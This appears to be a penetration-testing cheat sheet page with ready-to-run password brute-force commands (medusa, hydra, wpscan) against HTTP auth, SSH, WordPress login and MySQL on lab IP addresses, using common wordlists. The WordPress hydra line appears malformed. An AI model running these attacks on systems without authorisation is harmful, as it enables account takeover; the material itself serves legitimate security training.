---
description: /usr/share/seclists/Passwords/darkweb2017-top10000.txt
---

# Bruteforce

### htaccess-protected URL

<pre data-overflow="wrap"><code><strong>
</strong><strong>medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http -t 50 -f (-m DIR:/admin)
</strong></code></pre>

### ssh

<pre data-overflow="wrap"><code><strong>
</strong><strong>hydra -l offsec -P /usr/share/wordlists/rockyou.txt 192.168.213.52 -s 22 ssh -vV -f -t 10
</strong></code></pre>

### http

{% code overflow="wrap" %}
```
#monitor and  copy post request and change ^USER^ and ^PASS^
#test for valid account with dummy pw then test real password
hydra 192.168.168.64 http-form-post "/wp-login.php:http://192.168.168.78/wordpress/wp-login.php:INVALID LOGIN" -l admin -P {wordlist} -vV -f

#wp
wpscan --url http://dc-2/ --passwords passwords.txt 
```
{% endcode %}

### mysql

{% code overflow="wrap" %}
```

hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.168.88 mysql -t 4
```
{% endcode %}
